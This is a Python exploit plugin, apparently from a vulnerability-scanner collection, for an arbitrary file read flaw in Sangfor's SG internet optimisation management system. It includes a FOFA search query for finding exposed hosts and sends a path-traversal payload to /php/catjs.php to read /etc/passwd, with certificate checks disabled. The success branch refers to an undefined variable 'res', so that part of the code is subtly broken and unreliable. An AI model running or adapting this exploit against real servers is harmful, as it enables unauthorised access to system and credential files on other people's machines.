#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/lGsH8YY3JMKZPnPPIYfptg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '深信服SG上网优化管理系统任意文件读取',

      'level'     :   'high',

      'FOFA'      :   'title="SANGFOR上网优化管理"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/1/26',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': '*/*',
      'Connection': 'Keep-Alive',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  target = '/php/catjs.php'
  data = '["../../../../../../../etc/passwd"]'
  url1 = url + target
  ret['url'] = url1
  try:
    resp=requests.post(url=url1,headers=headers,data=data,timeout=10,verify=False)
    # print(resp.text)
    if resp.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',resp.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret